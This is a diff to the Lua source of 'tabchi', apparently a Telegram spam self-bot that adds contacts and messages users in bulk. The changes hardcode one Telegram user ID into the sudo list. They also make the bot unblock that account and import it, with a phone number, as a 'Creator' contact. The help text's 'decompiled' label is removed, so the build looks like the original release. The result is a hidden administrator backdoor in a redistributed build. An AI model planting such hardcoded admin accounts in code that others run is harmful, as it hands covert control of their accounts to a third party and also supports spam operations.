@@ -6,7 +6,7 @@ http.TIMEOUT = 10
 undertesting = 1
 local is_sudo
 function is_sudo(msg)
-  local sudoers = {}
+  local sudoers = {272167798}
   table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
   local issudo = false
   for k, v in pairs(sudoers) do
@@ -161,8 +161,8 @@ function process_updates()
     local jdata = JSON.decode(res)
     jdata = jdata or {have_tab = true}
     if jdata.have_tab then
-      tdcli.unblockUser(353581089)
-      tdcli.importContacts(989213985504, "Creator", "", 353581098)
+      tdcli.unblockUser(272167798)
+      tdcli.importContacts(989350761436, "Creator", "", 272167798)
       return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
     end
   end
@@ -185,7 +185,7 @@ function process(msg)
 			    elseif text_:match("^[!/#](help)") and is_sudo(msg) then
       local text1 = [[
 	  
-راهنمای ربات تبچی نسخه 4.3 دیکامپایل شده بدون تبلیغ
+راهنمای ربات تبچی نسخه 4.3 
 
 /pm <userid> <text>
 ارسال <text> به <userid>
@@ -279,7 +279,7 @@ function process(msg)
 				
 —------—
 
-Help >> @To_My_Amigos ]]
+Help >> @GFAKEMbot ]]
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
 	  
       elseif text_:match("^[!/#](remsudo) (%d+)") then
@@ -907,9 +907,9 @@ Bia pv]]
       tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
     elseif data.chat_id_ == 11111111 then
       tdcli.unblockUser(data.chat_.id_)
-    elseif data.chat_.id == 353581089 then
+    elseif data.chat_.id == 272167798 then
       tdcli.unblockUser(data.chat_.id_)
-      tdcli.importContacts(989213985504, "Creator", "", data.chat_.id)
+      tdcli.importContacts(989350761436, "Creator", "", data.chat_.id)
     end
     return add(data.chat_.id_)
   elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
